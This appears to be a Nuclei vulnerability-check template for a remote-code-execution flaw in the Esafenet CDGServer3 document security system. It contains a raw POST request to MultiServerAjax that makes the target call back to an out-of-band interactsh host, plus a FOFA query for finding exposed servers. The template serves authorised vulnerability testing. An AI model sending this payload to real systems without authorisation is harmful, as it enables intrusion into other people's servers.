id: esafenet-cdgserver3-MultiServerAjax-rce

info:
  name: 亿赛通电子文档安全管理系统 MultiServerAjax - rce
  author: leadlife
  severity: critical
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,rce,oob

http:
  - raw:
      - |
        POST /CDGServer3/MultiServerAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Android 5.0; Mobile; rv:52.0) Gecko/52.0 Firefox/52.0
        Accept-Encoding: gzip, deflate, br
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Connection: close
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Dnt: 1
        Upgrade-Insecure-Requests: 1
        Te: trailers
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 137

        command=connect&mainIp={{interactsh-url}}&servername={{interactsh-url}}&serverDesc=1&serverport=80&mainPort=80&serverLevel=high

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or